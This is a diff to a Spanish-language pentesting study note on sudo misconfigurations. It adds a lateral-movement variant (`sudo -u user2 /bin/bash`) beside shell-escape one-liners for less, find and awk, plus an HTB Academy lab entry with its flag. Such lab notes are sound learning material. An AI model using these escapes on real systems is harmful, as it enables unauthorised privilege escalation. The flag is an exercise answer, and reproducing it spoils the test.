@@ -66,6 +66,7 @@ id
 ```
 
 > [!tip] Variaciones comunes
+> - `sudo -u <usuario> /bin/bash`: Movimiento lateral cuando la regla autoriza ejecutar comandos en el contexto de un usuario específico no-root (`(user2 : user2) NOPASSWD: /bin/bash`).
 > - `less`/`more`/`man`: `!/bin/sh` desde el paginador
 > - `find`: `sudo find . -exec /bin/sh \; -quit`
 > - `awk`: `sudo awk 'BEGIN {system("/bin/sh")}'`
@@ -93,6 +94,7 @@ id
 ## Dónde la usé
 
 - [[HTB/Vaccine/Vaccine]] — `sudo -l` mostraba `(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf`. El intento directo con `-c` falló por restricción de argumentos; funcionó abriendo el archivo autorizado tal cual y usando `:set shell=/bin/sh` + `:shell` desde dentro de vi.
+- HTB Academy — Getting Started, Sección 11 (Escalada de Privilegios) — `sudo -l` mostraba `(user2 : user2) NOPASSWD: /bin/bash`. Movimiento lateral ejecutando `sudo -u user2 /bin/bash` (flag: `HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}`).
 
 ---
 
